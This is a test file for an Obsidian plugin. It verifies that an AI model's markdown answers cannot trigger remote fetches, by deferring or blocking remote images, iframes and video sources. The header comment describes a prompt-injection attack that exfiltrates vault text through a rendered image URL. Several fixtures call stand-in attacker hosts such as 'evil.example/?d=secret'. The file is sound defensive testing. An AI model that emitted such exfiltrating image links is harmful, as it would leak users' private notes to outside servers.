// @vitest-environment happy-dom
// Model output must never fetch a remote resource on its own: a prompt-injected
// `![](https://evil/?d=<vault text>)` would exfiltrate by being rendered. These
// tests fail in the forbidden direction — a remote src that survives.
import { describe, it, expect, vi } from "vitest";
import { readFileSync, readdirSync } from "node:fs";
import { join, resolve } from "node:path";
import "./helpers/viewHarness";
import { Component, MarkdownRenderer } from "obsidian";
import { blockRemoteMedia, deferRemoteMedia, isRemoteUrl } from "../ui/remoteMedia";
import { renderAnswerMarkdown, RenderSlot } from "../ui/renderMarkdown";

const ROOT = resolve(__dirname, "..");
const FETCHING = ["src", "srcset", "poster", "data"];

/** Every fetching attribute on a media element that still points off-device. */
function remoteSources(el: HTMLElement): string[] {
	return Array.from(el.querySelectorAll("img, iframe, audio, video, source, embed, object, track"))
		.flatMap((m) => FETCHING.map((a) => m.getAttribute(a) ?? "").filter((v) => v && (isRemoteUrl(v) || /https?:\/\//.test(v))));
}

/** Stand-in for Obsidian's renderer: markdown images and raw HTML become DOM. */
function fakeRender(md: string, el: HTMLElement): void {
	const html = md.replace(/!\[([^\]]*)\]\(([^)\s]+)\)/g, '<img alt="$1" src="$2">');
	const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
	for (const n of Array.from(doc.body.childNodes)) el.appendChild(document.importNode(n, true));
}

describe("deferRemoteMedia — the markdown never asks for a remote fetch", () => {
	it("turns a remote markdown image into an inert span", () => {
		const out = deferRemoteMedia("see ![x](https://evil.example/?d=secret) here");
		expect(out).not.toMatch(/!\[x\]\(https/);
		expect(out).toContain('class="p-remote-media"');
		expect(out).toContain('data-p-url="https://evil.example/?d=secret"');
	});

	it("resolves reference-style images", () => {
		const out = deferRemoteMedia("![a][r]\n\n[r]: https://evil.example/a.png");
		expect(out).toContain('data-p-url="https://evil.example/a.png"');
	});

	it("renames the fetching attributes of raw HTML media tags", () => {
		const out = deferRemoteMedia('<img src="https://e.x/a"> <iframe src=//e.x/f></iframe> <video poster="https://e.x/p"></video>');
		expect(out).not.toMatch(/\s(src|poster)=/);
		expect(out).toContain('data-p-blocked-src="https://e.x/a"');
		expect(out).toContain("data-p-blocked-src=//e.x/f");
		expect(out).toContain('data-p-blocked-poster="https://e.x/p"');
	});

	it("leaves local images, vault embeds and code alone", () => {
		const md = "![](attachments/a.png) ![[Note.png]]\n`![](https://x.y/z)`\n```\n![](https://x.y/z)\n```";
		expect(deferRemoteMedia(md)).toBe(md);
	});

	it("escapes the address it carries", () => {
		const out = deferRemoteMedia('![a"<b](https://e.x/?q="&x<y)');
		expect(out).toContain('data-p-url="https://e.x/?q=&quot;&amp;x&lt;y"');
		expect(out).toContain('data-p-alt="a&quot;&lt;b"');
	});
});

describe("blockRemoteMedia — nothing remote survives a render", () => {
	it("holds back a remote img that reached the DOM and restores it on a press", () => {
		const el = document.createElement("div");
		el.innerHTML = '<p><img src="https://evil.example/x.png" alt="x"><img src="local.png"></p>';
		blockRemoteMedia(el);
		expect(remoteSources(el)).toEqual([]);
		expect(el.querySelector('img[src="local.png"]')).not.toBeNull();
		const btn = el.querySelector<HTMLButtonElement>("button.p-remote-media-load")!;
		expect(btn.classList.contains("pb")).toBe(true);
		expect(btn.classList.contains("pb-link")).toBe(true);
		expect(btn.textContent).toContain("evil.example");
		btn.click();
		expect(el.querySelector("img")!.getAttribute("src")).toBe("https://evil.example/x.png");
		expect(el.querySelector("button.p-remote-media-load")).toBeNull();
	});

	it("holds back srcset, a video's sources and an iframe, one placeholder each", () => {
		const el = document.createElement("div");
		el.innerHTML = '<img srcset="https://e.x/a 1x"><video><source src="https://e.x/v.mp4"></video><iframe src="https://e.x/f"></iframe>';
		blockRemoteMedia(el);
		expect(remoteSources(el)).toEqual([]);
		expect(el.querySelectorAll("button.p-remote-media-load")).toHaveLength(3);
	});

	it("catches media the renderer adds after the render resolved", async () => {
		const el = document.createElement("div");
		blockRemoteMedia(el);
		const late = document.createElement("img");
		late.setAttribute("src", "https://late.example/x");
		el.appendChild(late);
		await new Promise((r) => setTimeout(r, 0));
		expect(remoteSources(el)).toEqual([]);
	});
});

describe("renderAnswerMarkdown — the one door for model output", () => {
	it("renders an exfiltrating answer without a remote src", async () => {
		const spy = vi.spyOn(MarkdownRenderer, "render").mockImplementation(async (_a, md, el) => fakeRender(md, el as HTMLElement));
		const el = document.createElement("div");
		await renderAnswerMarkdown({} as never, 'x ![](https://evil.example/?d=vault) <img src="https://e.x/b">', el, new Component());
		expect(remoteSources(el)).toEqual([]);
		expect(el.querySelectorAll("button.p-remote-media-load")).toHaveLength(2);
		// Pressing the markdown image's placeholder loads exactly that address.
		el.querySelector<HTMLButtonElement>("button.p-remote-media-load")!.click();
		expect(el.querySelector("img")!.getAttribute("src")).toBe("https://evil.example/?d=vault");
		spy.mockRestore();
	});

	it("no UI module renders markdown except through ui/renderMarkdown.ts", () => {
		// The user's own bubble in sidebar.ts is the one exception: it is not model output.
		const files = ["sidebar.ts", ...readdirSync(join(ROOT, "ui"), { recursive: true }).map(String)
			.filter((f) => f.endsWith(".ts")).map((f) => `ui/${f}`)];
		const offenders = files.filter((f) => f !== "ui/renderMarkdown.ts").flatMap((f) => {
			const calls = readFileSync(join(ROOT, f), "utf8").match(/MarkdownRenderer\.render\(/g) ?? [];
			return f === "sidebar.ts" ? (calls.length > 1 ? [f] : []) : calls.length ? [f] : [];
		});
		expect(offenders).toEqual([]);
	});
});

describe("RenderSlot — one owner per render, released by the next", () => {
	it("removes the previous child from its parent on renew and release", () => {
		const parent = new Component();
		const removed: Component[] = [];
		parent.removeChild = <T,>(c: T): T => { removed.push(c as unknown as Component); return c; };
		const slot = new RenderSlot(() => parent);
		const a = slot.renew();
		const b = slot.renew();
		expect(removed).toEqual([a]);
		expect(slot.current).toBe(b);
		slot.release();
		expect(removed).toEqual([a, b]);
		expect(slot.current).toBeNull();
	});
});
